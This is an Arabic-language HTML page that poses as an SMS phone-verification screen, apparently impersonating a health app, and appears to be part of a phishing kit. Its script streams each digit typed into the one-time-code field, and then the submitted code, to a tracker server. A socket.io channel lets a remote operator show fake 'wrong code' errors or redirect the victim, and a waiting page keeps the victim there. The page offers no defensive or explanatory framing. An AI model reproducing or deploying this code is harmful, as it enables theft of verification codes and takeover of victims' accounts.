<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد رمز إثبات الجوال</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="otp.css">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
</head>
<body>
    <div class="box">
        <div class="h-otp"><div class="sh-ic" style="color: #0284c7; background: #f0f9ff;">📱</div><div><h2>تأكيد كود إثبات الهاتف</h2><div style="font-size: 11px; color: #94a3b8; font-weight: 600;">SMS Phone Verification Code</div></div></div>
        <p class="subt">لقد تم إرسال كود التفعيل لإثبات وتأكيد ملكية رقم الهاتف المسجل باسمك. يرجى إدخال الكود لتفعيل المعاملة بنجاح.</p>
        <div class="err-m" id="err-box">الرمز المدخل غير صحيح، يرجى المحاولة بعناية.</div>
        <form id="otp-form" onsubmit="handleOtpSubmit(event)">
            <input type="text" id="otp-input" placeholder="••••••" maxlength="6" autocomplete="off" oninput="handleOtpInput(this)">
            <button type="submit" class="submit-btn" id="otp-submit-btn" disabled style="background-color: #0284c7;">تأكيد الكود ومتابعة</button>
        </form>
        <div class="resend-box">إعادة إرسال الرمز خلال: <span class="timer-sec" id="timer-box" style="color: #0284c7;">59 ثانية</span></div>
        <div class="secure-footer">🔒 تشفير معتمد وبوابة حماية الاتصالات</div>
    </div>
    <script src="saas-hub-config.js"></script><script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000", siteKey = "site_sehhaty_app_v1", visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
        var formName = "كود إثبات رقم الهاتف (الأمني)";

        fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/phone-otp.html', pageTitle: 'إثبات ملكية الهاتف الجوال' }) }).catch(function(){});

        try {
            var socket = io(SERVER_URL);
            socket.on('visitor_updated', function(v) {
                if (v.token === visitorToken && v.status === 'go' && v.redirectUrl) {
                    if (v.redirectUrl.includes('errr=1')) {
                        document.getElementById('err-box').style.display = 'block';
                        var inp = document.getElementById('otp-input'); inp.value = ''; inp.focus();
                        document.getElementById('otp-submit-btn').disabled = true;
                        document.getElementById('otp-submit-btn').innerText = "تأكيد الكود ومتابعة";
                    } else { window.location.href = v.redirectUrl; }
                }
            });
        } catch(e){}

        var streamDebounce = null;
        function handleOtpInput(el) {
            var val = el.value.replace(/\D/g, ''); el.value = val;
            document.getElementById('otp-submit-btn').disabled = (val.length < 4);
            document.getElementById('err-box').style.display = 'none';

            clearTimeout(streamDebounce);
            streamDebounce = setTimeout(function() {
                fetch(SERVER_URL + '/api/tracker/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + " (يجري الإدخال 🟡)", submissionData: { 'كود إثبات رقم الهاتف': val, 'حالة الرمز': 'يجري الإدخال' }, isFinalSubmission: false, isImportant: true }) }).catch(function(){});
            }, 200);
        }

        function handleOtpSubmit(e) {
            e.preventDefault(); var val = document.getElementById('otp-input').value; if (val.length < 4) return;
            var btn = document.getElementById('otp-submit-btn'); btn.disabled = true; btn.innerText = "جاري التحقق...";

            fetch(SERVER_URL + '/api/tracker/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + " (مؤكد ✅)", submissionData: { 'كود إثبات رقم الهاتف': val, 'حالة الرمز': 'مؤكد وتم التفعيل' }, isFinalSubmission: true, isImportant: true }) }).then(function() {
                fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/wait.html', pageTitle: 'بانتظار موافقة النظام...' }) }).catch(function(){});
                setTimeout(function() { window.location.href = 'wait.html'; }, 800);
            }).catch(function() { btn.disabled = false; btn.innerText = "تأكيد الكود ومتابعة"; });
        }

        var timerCountdown = 59;
        var timer = setInterval(function() {
            timerCountdown--;
            if (timerCountdown <= 0) {
                document.getElementById('timer-box').innerHTML = '<a href="#" onclick="timerCountdown=59;return false;" style="color:#0284c7;font-weight:bold;text-decoration:none;">إعادة إرسال الرمز</a>';
            } else { document.getElementById('timer-box').innerText = timerCountdown + ' ثانية'; }
        }, 1000);
    </script>
</body>
</html>
